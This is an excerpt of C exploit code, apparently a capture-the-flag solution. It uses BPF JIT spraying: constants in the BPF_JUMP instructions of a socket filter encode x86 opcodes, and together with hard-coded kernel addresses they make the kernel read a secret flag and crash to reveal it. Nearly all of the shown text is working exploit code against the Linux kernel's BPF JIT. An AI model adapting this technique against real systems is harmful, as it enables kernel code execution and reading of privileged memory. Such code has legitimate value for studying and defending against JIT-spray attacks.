...
#define FLAG 0xFFFFFFFF8228B000
#define JITED 0xFFFFFFFFC0010800
...
static void movsx_rax_i32(struct sock_filter *f, int *i, int v) {
  int j;

  /* xor eax, eax */
  f[(*i)++] = BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, 0x05ebc031, 0, (*i) & 1);
  for (j = 0; j < 32; j++) {
    /* add eax, eax */
    f[(*i)++] = BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, 0x05ebc001, 0, (*i) & 1);
    if (v & (1L << (31 - j)))
      /* inc eax */
      f[(*i)++] = BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, 0x05ebc0ff, 0, (*i) & 1);
  }
  /* cdqe */
...
int main(void) {
  ...
  movsx_rax_i32(filter, &i, (int)FLAG);
  /* mov ebx,[eax] */
  filter[i++] = BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, 0x05eb188b, 0, i & 1);
  /* let it crash and show us the flag in ebx */
